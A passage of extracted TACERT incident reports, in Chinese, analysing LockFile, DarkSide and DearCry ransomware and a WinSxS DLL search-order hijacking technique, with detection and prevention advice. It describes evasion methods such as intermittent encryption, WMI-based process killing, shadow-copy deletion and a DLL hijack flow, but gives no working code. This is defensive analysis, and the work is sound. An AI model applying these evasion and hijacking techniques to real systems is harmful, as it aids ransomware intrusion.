        "File_Name": "個案分析-利用ProxyShell漏洞的勒索病毒LockFile分析報告.pdf",
        "content": "地址,所使 用網域名「contipauper.com」是在2021/8/16 被建立。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 使用Tor 瀏覽器開啟駭客所提供網址後,看到與Ransom note 相同內容 的網頁。 8. Autoupdate.exe 執行後會呼叫mshta.exe 執行放在public 資料夾內的 LOCKFILE-README.hta。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. Autoupdate.exe 執行後會修改登錄檔,將 LOCKFILE-README-[hostname]-[id].hta 設定為每次開機啟動。 (修改登錄檔後如下圖) (重開機後啟動mshta.exe 程式來執行hta 腳本如下圖) 10. 檢視主機被加密情形,發現該勒索軟體只對特定檔案格式進行加密, 例如:.docx、 .txt、.pptx。該勒索軟體不會攻擊 JPG 圖像文件,比如 照片。被加密的檔案會延伸出副檔名為lockfile。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. LockFile 勒索軟體會對文件檔每隔 16 bytes 進行加密(間歇性加密),這 意味著文件檔保持部分可讀。間歇性加密會扭曲統計分析,並且會混 淆一些保護技術。 間歇性加密有助於勒索軟體逃避某些勒索軟體保護解決方案的檢測, 因為加密文件在統計上看起來與未加密的原始文件非常相似。使用 DarkSide 和 LockFile 加密相同的文件檔,之後比較LockFile 加密後 的檔案與Darkside 加密後的檔案,會發現LockFile 加密後的檔案與原 始檔案相似(因為採用間歇性加密),而Darkside 加密後的檔案則與原始 檔案完全不同(因為整個檔案進行加密)。這間歇性加密技巧將成功對抗 勒索病毒保護軟體,而該保護軟體通過統計分析執行內容檢查以檢測 加密。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 被加密檔案與LOCKFILE-READ",
        "Page_Num": "5,6,7,8,9"
    },
    "305": {
        "File_Name": "個案分析-利用ProxyShell漏洞的勒索病毒LockFile分析報告.pdf",
        "content": "ME-[hostname]-[id].hta 經 ID Ransomware 勒索軟體識別網站檢測為LockFile 勒索軟體,目前該勒 索軟體仍然在被分析中。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、攻擊行為示意圖 1. 駭客利用ProxyShell 漏洞駭入受害主機。 2. 在受害主機上執行autoupdate.exe。 3. 呼叫WMIC.exe 來中斷含有特定用字的應用程序。 4. 執行mshta.exe 腳本程序來加密與產生Ransom note。 5. 呼叫cmd.exe 執行指令來刪除自己本身。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 總結與建議 1. 勒勒索軟體LockFile 為一種新型病毒,它與其他勒索軟體最大的差異 在其使用間歇性加密來逃避檢測。 2. LockBit 2.0、DarkSide 和 BlackMatter 等其他勒索軟體使用了部分加 密,僅加密檔案的開頭以加快程序,但LockFile 的方法不同。它只加 密檔案內的資料塊,而不是其完整內容。這做法加快了加密過程(資料 損壞過程),但也欺騙了依賴統計分析來檢測潛在未授權檔案加密的勒 索軟體保護系統。 3. 它利用 Windows 管理界面 (WMI) 掃描並中斷與業務應用程序相關 的重要程序。(包括Hyper-V 虛擬機、Oracle VM Virtual Box 管理器、 Oracle VM Virtual Box 服務、Microsoft SQL Server、MySQL 資料庫、 Oracle MTS 恢復服務、Oracle RDBMS 內核、Oracle TNS 偵聽器和 VMware 虛擬機。) 4. 終止這些程序的目的是移除資料庫、虛擬機或這些應用程序放置的配置 檔案上的任何系統鎖,以便勒索軟體可以加密它們。 通過利用 WMI, 程序將被系統本身終止,而不是由勒索軟體可執行檔案終止。 這是另 一種檢測規避技術,也旨在使事件響應複雜化。 5. 關於預防勒索軟體LockFile 攻擊的資安防護措施,除了定期進行資料",
        "Page_Num": "9,10,11"
    },
    "306": {
        "File_Name": "個案分析-利用ProxyShell漏洞的勒索病毒LockFile分析報告.pdf",
        "content": "備份外,需修補ProxyShell 漏洞,以防止它透過漏洞入侵主機。 五、 相關參考資料 1. ProxyShell vulnerabilities actively exploited to deliver web shells and ransomware https://www.helpnetsecurity.com/2021/08/23/proxyshell-vulnerabilities-ex  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team ploited/ 2. Almost 2,000 Exchange servers hacked using ProxyShell exploit https://therecord.media/almost-2000-exchange-servers-hacked-using-prox yshell-exploit ",
        "Page_Num": "11,12"
    },
    "307": {
        "File_Name": "個案分析-利用WinSxS資料夾的 DLL搜尋劫持攻擊分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE 利用WinSxS 資料夾的 DLL 搜尋劫持攻擊分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2024 年01 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 2022 年11 月學術網路陸續發現Waterbear 中繼站攻擊事件。分析Waterbear 系列案件發現駭客採用幽靈 DLL 挾持與 DLL 側載 (DLL Side Loading) 的 方式載入惡意DLL,接著利用檔案過大之DLL,透過它將登錄檔的Shellcode 解密後連線中繼站。由此可知,來自DLL 的攻擊不容忽視。 2. 2024 年1 月資安公司 Security Joes 發現一種新的 DLL 搜尋順序劫持的攻擊 手法。該方法利用受信任的 WinSxS 資料夾中常見的可執行檔,允許駭客在 攻擊中無需額外添加二進位檔案的情況下繞過高權限要求,進而在WinSxS 資料夾內的應用程式中執行惡意程式碼。 3. 它不需要引入自己的二進位檔案,因為已經有各種可利用的檔案儲存在 WinSxS 資料夾中。與傳統的 DLL 搜尋順序劫持技術相比,這種方法降低 了被防毒軟體和事件回應程式偵測到的可能性,因為惡意程式碼是從位於 C://Windows / WinSxS 資料夾內的二進位檔案的記憶體空間中執行的。 二、 DLL 搜尋順序劫持技術 1. DLL 搜尋順序劫持技術(DLL Search Order Hijacking)是指攻擊者可以透過劫 持用於載入 DLL 的搜尋順序來執行自己的惡意payload。 2. 根據 MITRE ATT&CK 資料,攻擊者可以採用多種方法來劫持 DLL 載入的 過程,但所有這些方法都有一個共同點:目標應用程式未指定所需內容的完 整路徑, 故駭客將惡意 DLL 放置在搜尋順序優先於合法 DLL 的目錄中。 通常,此操作的",
        "Page_Num": "1,2"
    },
    "308": {
        "File_Name": "個案分析-利用WinSxS資料夾的 DLL搜尋劫持攻擊分析報告.pdf",
        "content": "首選位置是目標應用程式的工作目錄,因為它在搜尋順序中 佔據顯著位置。 3. Windows 系統會尋找所需的 DLL 以載入到程式中,其所遵循的大致搜尋位 置如下。 (1)啟動應用程式的目錄。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2)資料夾「C:\\Windows\\System32」。 (3)資料夾「 C:\\Windows\\System」。 (4)資料夾「 C:\\Windows」。 (5)目前工作目錄。 (6)系統 PATH 環境變數中列出的目錄。 (7)在使用者的 PATH 環境變數中列出的目錄。 4. 關於應用DLL 搜尋順序劫持技術的駭客團體有哪些,可從MITRE ATT&CK 資料得知一些在入侵中已使用此技術的駭客團體如下,更多資訊可參閱本文 參考資料。 駭客團體 說明 APT41 利用搜尋順序劫持技術來執行惡意payload,例如 Winnti RAT。 Aquatic Panda 使用 DLL 搜尋順序劫持技術將 exe、dll 和 dat 檔案載入 到記憶體中。 Downdelph 使用DLL 搜尋順序劫持技術執行 sysprep.exe 來提升權限。 Evilnum 使用惡意軟體變種 TerraTV 載入位於 TeamViewer 目錄中 的惡意 DLL,而不是位於系統資料夾中的原始 Windows DLL。 Hikit 使用 DLL 搜尋順序劫持技術來載入 oci.dll 作為持久機 制。 RTM 使用搜尋順序劫持技術來強制 TeamViewer 載入惡意 DLL。 Threat Group-3390 已執行 DLL 搜尋順序劫持技術來執行其有效payload。 Tonto Team 濫用合法且經過簽署的 Microsoft 執行檔來啟動惡意 DLL。 WEBC2 其變種透過使用 DLL 搜尋順序劫持技術來實現持久性,通 常是將 DLL 檔案複製到系統目錄下(如 C:\\WINDOWS\\ntshrui.dll)。 Whitefly 使用搜尋順序劫持技術來執行載入程式 Vcrodat。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、 WinSxS 資料夾 1.",
        "Page_Num": "2,3,4"
    },
    "309": {
        "File_Name": "個案分析-利用WinSxS資料夾的 DLL搜尋劫持攻擊分析報告.pdf",
        "content": "WinSxS(Windows Side by Side)資料夾是Windows 作業系統維 護和復原的關鍵元件存放區,通常位於 C:\\Windows\\WinSxS。 2. 它的主要功能是儲存各個版本的重要系統檔案。 當 Windows 進 行更新時,它會在 WinSxS 資料夾中保留先前版本的元件。 因 此,WinSxS 資料夾的大小往往會隨著每次 Windows 更新而增 加。 3. 在安裝 Windows 元件、更新軟體期間,系統檔案儲存在 WinSxS 資料夾中。 該資料夾充當系統檔案(特別是 DLL)的集中儲存 庫,這些檔案在各種應用程式和元件之間共享,以確保相容性並 防止潛在的衝突。 4. WinSxS 資料夾的主要用途如下: (1) 版本管理 它儲存DLL 和多個版本的系統檔案,確保根據需要進行高效 存取。 此功能對於保持與各種應用程式的相容性至關重要, 因為不同的程式可能需要同一元件的特定版本。 (2) 系統完整性 WinSxS 資料夾透過防止不正確或損壞的系統檔案版本取代 正確的系統檔案,來維護系統的完整性,這保證了作業系統的  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 穩定性和可靠性。 (3) 動態啟動 此資料夾有助於使用者根據需要動態啟用或停用Windows 的 特定功能,無需單獨安裝。 5. 有關WinSxS 資料夾的二進位檔案相依性劫持技術,是針對位於 WinSxS 資料夾中的應用程式,改進了傳統的 DLL 搜尋順序劫持 技術。其主要優點如下: (1) 規避高權限要求 透過針對 WinSxS 資料夾中的應用程式,無需提升權限即可 在應用程式中執行惡意程式碼。 (2) 消除對額外二進位檔案的需求 由於 Windows 已經在 WinSxS 資料夾中索引了這些二進位 檔案,因此無需駭客攜帶自己易受攻擊的應用程式。 (3) 增強隱蔽性 在從 WinSxS 資料夾執行的應用程式的記憶體空間中執行惡 意程式碼,可以增強隱蔽性並最大限度地降低檢測",
        "Page_Num": "4,5"
    },
    "310": {
        "File_Name": "個案分析-利用WinSxS資料夾的 DLL搜尋劫持攻擊分析報告.pdf",
        "content": "風險。 四、 攻擊流程 針對WinSxS 資料夾內應用程式的 DLL 搜尋順序劫持技術的  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 攻擊流程如下圖。首先,駭客會先建立自訂的 「NOT_A_SYSTEM_FOLDER_MS」 資料夾與自訂的DLL,接著在主 機內部定位該資料夾的位置,之後執行在Win SxS 資料夾內的 二進位執行檔,例如:執行ngentask.exe。執行它後,主機會 啟動執行DLL 搜尋順序劫持技術,來取代當前目錄中所搜尋的 二進位執行檔的DLL。之後二進位執行檔會載入已被重新命名 的自訂DLL,例如:mscorsvc.dll。最後會將更名後的DLL 注入 到WinSxS 資料夾內的二進位執行檔中。 五、 總結與建議 1. 本文所介紹之攻擊手法是指利用搜尋二進位執行檔所用之DLL 時,以駭客自訂的DLL 更名後讓系統優先搜尋到它。這種取代原  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 先DLL 的方式為DLL 搜尋順序劫持攻擊,而此攻擊所需之二進 位執行檔都存在WinSxs 資料夾內。 2. 這種技術將傳統的 DLL 搜尋順序劫持與複雜的 WinSxS 資料夾 結合,展示了網路威脅不斷演變的本質。它讓駭客不需要準備要 執行的二進位執行檔,只需利用一個命令列與注入自訂的DLL 即 可進行攻擊,而且它能有效避開防毒軟體偵測,讓使用者不易察 覺異常。 3. 關於此類攻擊手法可能造成的影響,由於DLL 搜尋順序劫持技術 會以自訂的惡意DLL 取代原二進位執行檔所用的DLL,所以會對 CIA 中的完整性造成衝擊。 4. 下面有兩項偵測此類型攻擊與其預防措施,提供大家參考。 (1) 程序分析 (1.1) 可利用微軟Process Explorer ",
        "Page_Num": "5,6,7"
    },
    "311": {
        "File_Name": "個案分析-利用WinSxS資料夾的 DLL搜尋劫持攻擊分析報告.pdf",
        "content": "工具查看程序執行時呼叫哪 些DLL,再查看程序所用DLL 是否有儲存在異常位置。 (1.2) 檢查程序之間的父、子程序關係,尤其是受信任的二進位 檔案。 可尋找涉及以下內容的活動: (a)從 WinSxS 資料夾呼叫二進位檔案的異常程序。 (b)在WinSxS 資料夾內二進位檔案產生意外的子程序。 (2) 行為分析  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 監視 WinSxS 資料夾內二進位檔案執行的所有活動,例如:網 路連線和檔案操作。可以尋找以下的活動: (a)連接到遠端伺服器的 WinSxS 二進位檔案。 (b)WinSxS 二進位檔案從不常見的資料夾載入模組。 參考資料 1. Hijack Execution Flow: DLL Search Order Hijacking https://attack.mitre.org/techniques/T1574/001/ 2. Hide and Seek in Windows' Closet: Unmasking the WinSxS Hijacking Hideout https://www.securityjoes.com/post/hide-and-seek-in-windows-closet-unmasking-t he-winsxs-hijacking-hideout 3. How to Find Out What DLLs Are Loaded by a Process https://forums.ivanti.com/s/article/How-to-find-out-what-DLLs-are-loaded-by-a-p rocess?language=en_US ",
        "Page_Num": "7,8"
    },
    "312": {
        "File_Name": "個案分析-勒索病毒 DarkSite 分析報告.pdf",
        "content": "TLP:WHITE 勒索病毒DarkSite 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2021 年06 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2020/8 DarkSide 勒索病毒首次出現,之後DarkSide 駭客集團推出其勒索病毒 服務(RaaS)給其他駭客集團使用,並且從中收取一定比例的佣金。根據趨勢 科技資料與Fireeye 公司報導顯示,它影響了超過 15 個國家和多個垂直行業 的組織,美國是目前受害最嚴重的國家,其次是法國、比利時、加拿大。它 的攻擊跨越多個領域,包括金融服務、法律、製造、專業服務、零售和技術。 2. 從DarkSide 駭客集團在暗網上洩露內部資料遭外洩的受害組織列表可看出, 他們過去已經繼續攻擊石油和天然氣行業的受害者,估計受害公司至少有90 家,約有2TB 的資料被竊取。 3. 2021/5 DarkSide 攻擊美國東岸負責近半數油管運輸的Colonial Pipeline 公 司,造成美國多州油品供應中斷。該駭客集團除了使電腦系統鎖死外,還竊 取100GB 以上資料,使用慣用的雙重勒索伎倆。為迄今為止針對美國關鍵基 礎設施攻擊的最嚴重網路攻擊。 為應對勒索軟體攻擊事件,Colonial Pipeline 已關閉了 5,500 英里的燃料管 道。圖片來源:colpipe.com  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. DarkSide 駭客集團慣用網路釣魚、遠端桌面連線(RDP)與攻擊已知漏洞的方 式,加上搭配常見的合法工具來入侵組織。在入侵組織後會進行潛伏,尋找 組織內所有重要資料。在將重要資料外傳之後才發動勒索病毒攻擊。 5. 根據elliptic 統計資料顯示,DarkSide 駭客集團在過去 9 個月內向多個比特 幣錢包收取了受害者至少 9,000 萬美元的贖金。 ",
        "Page_Num": "1,2,3"
    },
    "313": {
        "File_Name": "個案分析-勒索病毒 DarkSite 分析報告.pdf",
        "content": "圖片來源:elliptic 6. 根據elliptic 資料顯示,受害者支付的任何贖金都會在附屬公司和開發商之間 分攤。 開發商對低於 500,000 美元的贖金收取 25%,但對於高於 500 萬美 元的贖金,則比例降至 10%。 DarkSide 開發商總共收到了價值 1550 萬美 元(17%)的比特幣,其餘的 7470 萬美元(83%)則流向了各個附屬公司。 圖片來源:elliptic 7. 為了瞭解勒索軟體DarkSite 的攻擊行為,本中心取得該類型勒索軟體的樣本 後進行檢測。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 二、事件檢測 1. 首先,在64 位元的Windows 10 作業系統上,執行DarkSite 樣本6931b.exe (MD5: 9009593ebf5ea20407ab19bff045dc9d)。 2. 執行後先產生LOG.3b8cbc43.txt,接著產生README.3b8cbc43.txt 於DarkSite 樣本所在資料夾內。產生LOG.3b8cbc43.txt 的行為,與以往勒索病毒僅產生 勒索通知信有很大不同。 3. 檢視LOG.3b8cbc43.txt,發現它為病毒執行行為的log 紀錄檔。從log 檔得知 在該病毒執行後,除了加密檔案外,也會清空資源回收桶、移除服務、 刪除 影子副本、中斷程序,並且以最快速度模式加密檔案。所加密的檔案除了本 機磁碟外,還有網路磁碟機內的檔案(網路分享)。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 6931b.exe 執行後,會執行16 進制編碼的powershell 腳本來刪除受感染主機 中的影子副本。 5. 由勒索通知信內容得知駭客告訴受害者下列資訊: (1) 告訴受害者他們已持有100GB 以上資料。 (2) 提供一個個人資料外洩的連結。 (3) 告訴受害者可透過Tor 瀏覽器開啟一個網址。 (4) 接著輸入",
        "Page_Num": "3,4,5"
    },
    "314": {
        "File_Name": "個案分析-勒索病毒 DarkSite 分析報告.pdf",
        "content": "密鑰來獲取支付贖金的訊息。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 6931b.exe 執行後,對於一些特定資料夾與特定檔案類型都不會加密,例 如:C:\\windows 與C:\\program files 資料夾,文字檔、系統檔與程式檔都不加密。 所有被加密檔案之延伸副檔名(如3B8CBC43)為受害主機guid 經過4 輪crc32 產生的checksum。在每一個資料夾中都有勒索通知信 README.3b8cbc43.TXT。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 6931b.exe 經Virustotal 檢測其惡意比例為57/68,57 個防毒軟體中僅有5 個防 毒軟體以DarkSide 命名它。 8. 它經ID Ransomware 勒索軟體識別網站 (https://id-ransomware.malwarehunterteam.com) 檢測結果為 DarkSide。目前尚 無解密金鑰。 三、攻擊行為示意圖  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1.駭客利用網路釣魚、遠端桌面連線(RDP)與已知漏洞的方式駭入受害主機 中。 2.駭入後駭客會先潛伏來尋找組織的重要資料。 3.在收集完重要資料後駭客會將資料外傳。 4.外傳資料完成後,即進行加密檔案作業。 4.1 在執行DarkSite 後,會先產生紀錄執行行為的log 檔。 4.2 進行清空資源回收桶。 4.3 移除服務。 4.4 刪除主機內的影子副本。 4.5 中斷程序。 4.6 陸續加密本機磁碟機內檔案。 4.7 加密所連線的網路磁碟機內檔案。 4.8 加密作業完成後產生勒索通知信。 5.受害者依勒索通知信的指示,使用Tor 瀏覽器讀取支付贖金資訊網頁與個 人資料外洩網頁。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 總結",
        "Page_Num": "5,6,7,8,9"
    },
    "315": {
        "File_Name": "個案分析-勒索病毒 DarkSite 分析報告.pdf",
        "content": "與建議 1. Darkside 使用勒索軟體即服務(RaaS),會審查網路犯罪分子用來感染勒索 軟體的公司。勒索軟體開發商負責建立惡意軟體,而勒索軟體附屬公司則 負責感染目標主機系統,並與受害者組織協商支付贖金。 這種新的商業 模式讓無技術能力建立惡意軟體但能夠滲透到目標組織的攻擊者也能參 與攻擊。 2. Darkside 通過網路釣魚、已知漏洞與遠端桌面協議 (RDP) 來獲得訪問權 限後,Darkside 攻擊者會部署 Darkside 勒索軟體來加密和竊取敏感資 料。它習慣使用「雙重勒索」的方式對特定目標發動勒索病毒的攻擊。 3. 近日美政府頒布「勒索軟體企業防範指引」鼓勵各企業對於勒索病毒的攻 擊與預防需謹慎對待,將勒索軟體視為對其核心業務運營的威脅,而非簡 單的資料盜竊風險。 4. 對於預防DarkSide 的攻擊,有下列幾點資安防護的建議措施提供大家參 考。 (1) 加強資料備份的還原能力(備份組織資料、系統映像檔與組態,備份檔 應離線保存並定期測試)。 (2) 實施多因素身份驗證制度(因為密碼本身可能被洩露)。 (3) 定期更新系統軟體版本與修補漏洞。 (4) 不輕易開啟不明來源的信件或附件。 (5) 定期進行端點檢測和響應(尋找網路上的惡意活動並阻止它)。 (6) 對於機敏性資料進行加密(如果資料被盜,將無法使用)。 (7) 不允許網際網路上的主機暴露3389 port。 (8) 禁止主機與主機之間的不必要通訊(避免病毒感染橫向擴散)。 (9) 檢視通過跳轉主機發生的所有管理活動(跳轉主機可能成為攻擊目 標) 。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (10) 刪除任何被認為不是日常操作必需的應用程式。 (11) 啟用強大的垃圾郵件過濾器,以防止網路釣魚電子郵件到達最終用 戶。 (12) 實施用戶培訓計劃和針對魚叉式網路釣魚的模擬攻擊。 (13) 過濾網路流量以",
        "Page_Num": "9,10"
    },
    "316": {
        "File_Name": "個案分析-勒索病毒 DarkSite 分析報告.pdf",
        "content": "禁止與已知惡意 IP 的通訊。通過實施 URL 封鎖名 單或許可名單來防止用戶訪問惡意網站。 (14) 安裝防毒軟體並且定期執行掃毒作業。 (15) 委外授權專業的資安團隊協助( 可快速修補資安問題,並在組織防禦 中共享和合併威脅信息)。 (16) 定期測試資安事件的應變計畫。 (17) 檢查資安防護能力 (找第 3 方滲透測試業者來測試系統的安全性以 及抵禦複雜攻擊的能力)。 (18) 切割組織內網路 (例如:營運業務和生產製造所用的網路必須分開, 並且仔細過濾和限制互聯網對營運網路的存取) 。 五、 相關參考資料 1. 勒索病毒攻擊手法發展有四個階段如下圖,本案使用雙重勒索手法。現 在的勒索病毒攻擊,大多數採取雙重勒索手法,但最大的轉變是「開 始攻擊企業的關鍵系統」。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資料參考來源: https://blog.trendmicro.com.tw/?p=68204 https://blog.trendmicro.com.tw/?p=68319 Maze: https://research.checkpoint.com/2020/ransomware-evolved-double-extorti on/ Avaddon、SunCrypt、RagnarLocker : https://www.bleepingcomputer.com/news/security/another-ransomware-no w-uses-ddos-attacks-to-force-victims-to-pay/ Cl0p: https://krebsonsecurity.com/2021/04/ransom-gangs-emailing-victim-custo mers-for-leverage/ 2. RANSOMWARE AS A SERVICE (RAAS) (1) 何謂Raas? 勒索軟體即服務 (RaaS) 是勒索軟體開發商使用的一種商業模 式,他們租賃勒索軟體變體的方式與合法軟體開發商租賃 SaaS 產品的方式相同。RaaS 讓每個人,甚至是沒有太多技術知識的 人,都能夠通過註冊服務來發起勒索軟體攻擊。 (2) Raas 的運作原理 客戶只需登錄 RaaS 入口",
        "Page_Num": "10,11"
    },
    "317": {
        "File_Name": "個案分析-勒索病毒 DarkSite 分析報告.pdf",
        "content": "網站,建立帳戶,使用比特幣付款,輸 入有關他們希望建立的惡意軟體類型的詳細信息,然後單擊提交 按鈕即可。訂閱者可以獲得與合法 SaaS 產品訂閱者所獲得的相 同支援、文件、功能更新和其他好處。RaaS 運營商提供入口網站, 讓他們的訂閱者可以查看感染狀態、總付款、加密文件總數以及  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 有關其目標的其他信息。 資料參考來源: https://www.crowdstrike.com/cybersecurity-101/ransomware/ransom ware-as-a-service-raas/ 3. 最著名的勒索軟體即服務(RaaS)之勒索軟體變種如下表所示,其他使用 RaaS 的勒索軟體還有DarkSide、Dharma、Thanos...。 勒索軟體名稱 說明 Ryuk 它是現存最多產和最昂貴的勒索軟體變種之一。 據估 計,2019 年約有三分之一的勒索軟體感染是由 Ryuk 造 成的。 該勒索軟體還可以有效地說服目標支付其贖金要 求,至2020 年1 月為止估計已賺了 1.5 億美元。 Lockbit Lockbit 自 2019 年 9 月以來一直存在,但它2020 年才 進入 RaaS 領域。 它專注於快速加密大型組織的系統, 最大限度地減少防御者在造成損害之前檢測和消除惡意 軟體的機會。 REvil/ Sodinokibi REvil 與 Ryuk 競爭,成為最貪婪的勒索軟體變種。 這 種惡意軟體以各種方式傳播,眾所周知,REvil 的附屬公 司利用未修補漏洞的 Citrix 和 Pulse Secure VPN 來感 染系統。 Egregor/ Maze Maze 勒索軟體變種創造第一個引入「雙重勒索」的歷 史,其中包括竊取資料作為勒索軟體攻擊的一部分,並 威脅在不支付贖金的情況下破壞資料。 雖然 Maze 已停 止運營,但相關的勒索軟體變種(如 Egregor)仍在運營, 並在 RaaS 附屬模式下",
        "Page_Num": "11,12"
    },
    "318": {
        "File_Name": "個案分析-勒索病毒 DarkSite 分析報告.pdf",
        "content": "運行。 資料參考來源: https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/ran somware-as-a-service-raas/ 4. 美政府頒布勒索軟體企業防範指引 https://www.ithome.com.tw/news/144869 https://assets.documentcloud.org/documents/20796933/memo-what-we-ur ge-you-to-do-to-protect-against-the-threat-of-ransomware17.pdf 5. Under Attack: Protecting Against Conti, DarkSide, REvil and Other  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team Ransomware https://www.crowdstrike.com/blog/how-to-defend-against-conti-darkside-r evil-and-other-ransomware/ 6. Twitter 上Darktracer 貼文 https://twitter.com/darktracer_int/status/1391744217513304067 7. DarkSide 勒索病毒與美國輸油管攻擊事件(更新) https://blog.trendmicro.com.tw/?p=68204 8. Shining a Light on DARKSIDE Ransomware Operations https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-d arkside-ransomware-operations.html 9. A Closer Look at the DarkSide Ransomware Gang https://krebsonsecurity.com/2021/05/a-closer-look-at-the-darkside-ransom ware-gang/ 10. DarkSide Ransomware has Netted Over $90 million in Bitcoin https://www.elliptic.co/blog/darkside-ransomware-has-netted-over-90-mill ion-in-bitcoin ",
        "Page_Num": "12,13"
    },
    "319": {
        "File_Name": "個案分析-勒索病毒DearCry分析報告.pdf",
        "content": "TLP:WHITE 勒索病毒DearCry 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2021 年04 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2021/3 初 微軟發出安全公告,指出中國駭客組織Hafnium 已利用Microsoft Exchange Server 的ProxyLogon 漏洞(編號:CVE-2021-26855、CVE-2021-26857、 CVE-2021-26858 及CVE-2021-27065)成功駭入郵件系統。 2. ProxyLogon 是重大的無需驗證的遠端程式碼執行(Pre-Auth Remote Code Execution)零日漏洞,可讓攻擊者得以繞過身份驗證步驟。在駭入後會植入 web shell 程式,來從遠端控制受害的Exchange Server,包括竊取資訊、執行 任意程式碼或在內部網路橫向移動等RCE 漏洞可能造成的攻擊。 3. 在ProxyLogon 漏洞被揭露後,陸續發生利用此漏洞的攻擊事件,其中勒索病 毒DearCry 的攻擊事件就此誕生。 4. 勒索軟體識別網站ID-Ransomware 的建立者Michael Gillespie 發現,從 2021 年3 月9 日開始,有用戶向其系統提交從Exchange Server 上取得的新勒索通 知信和被加密檔案。同時受害人還在BleepingComputer 論壇中聲明其 Exchange Server 已被使用ProxyLogon 漏洞進行了入侵,而且遭受DearCry 勒索軟體攻擊。 5. McAfee 網路調查負責人John Fokker 表示在美國、盧森堡、印度尼西亞、愛 爾蘭、印度和德國等國有看到此類型的受害者。雖然檢測率仍然很低,但 Fokker 指出檢測率仍在繼續增長。 全球感染DearCry 之受害主機數量分佈圖 (來源:McAfee Insights)  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 為了瞭解勒索軟體DearCry 的攻擊行為,本中心取得該類型勒索軟體的樣本 後進行檢測。 二、",
        "Page_Num": "1,2,3"
    },
    "320": {
        "File_Name": "個案分析-勒索病毒DearCry分析報告.pdf",
        "content": "事件檢測 1. 首先,使用一台有掛載網路磁碟機之資料夾的Windows 7 主機。接著將樣本 2b9838da7.exe 置於主機上執行。執行後不久同資料夾內出現副檔名為CRYPT 的檔案,而且在桌面出現readme.txt 的文字檔。2b9838da7.exe 在執行後仍然 在原資料夾內,並未消失,可以得知它不是無檔案式的勒索軟體。 2. 開啟readme.txt 後得知為一封勒索通知信,在信中駭客告訴受害者你的檔案 已經被加密,若想解密需與駭客聯絡。隨信附上兩個駭客的E-mail 信箱與受 害主機ID 的Hash 值,並且要求受害者需將此Hash 值放在聯絡的信件中。 3. 搜尋readme.txt 在主機內的所在位置,得知該檔案只出現在三個位置,分別 在除了作業系統磁碟C 槽外的兩個磁碟(Z:與D:)內與桌面上。此特徵與一般 勒索軟體會將勒索通知信放在每一個拜訪過的資料夾中之特性不同。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 以記事本打開desktop.ini.CRYPT 後,在內容第一句出現「DEARCRY!」的用 字。 5. 檢視多個被加密檔案的Hex 內容,發現每個檔案開頭第一句都是 「DEARCRY!」。此種對被加密檔案進行勒索軟體名稱標示的作法,在一般勒 索軟體的攻擊中是不常見的。 6. 從網路磁碟機內檔案被加密的情形發現,並不是所有的檔案都會被加密,推 測此勒索軟體只會對於某些類型的檔案進行加密,而且被加密的檔案之副檔 名皆為CRYPT。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視2b9838da7.exe 的程式原始碼內容,得知該勒索軟體會加密的檔案類型有 「.TIF .TIFF .PDF .XLS .XLSX .XLTM .PS .PPS .PPT .",
        "Page_Num": "3,4,5"
    },
    "321": {
        "File_Name": "個案分析-勒索病毒DearCry分析報告.pdf",
        "content": "PPTX .DOC .DOCX .LO G .MSG .RTF .TEX .TXT .CAD .WPS .EML .INI .CSS .HTM .HTML .XHTM L .JS .JSP .PHP .KEYCHAIN .PEM .SQL .APK .APP .BAT .CGI .ASPX .CER .C FM .C .CPP .GO .CONFIG .PL .PY .DWG .XML .JPG .BMP .PNG .EXE .DLL . CAD .AVI .H.CSV .DAT .ISO .PST .PGD .7Z .RAR .ZIP .ZIPX .TAR .PDB .BI N .DB .MDB .MDF .BAK .LOG .EDB .STM .DBF .ORA .GPG .EDB .MFS」等 80 種。 8. 在2b9838da7.exe 的程式原始碼中,發現該勒索軟體的RSA 公開金鑰內容。 9. 分析2b9838da7.exe 的程式碼,發現在debug 資訊內存在一個PDB 路徑資訊 「c:\\users\\john\\documents\\visual studio 2008\\projects\\encryptfile  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 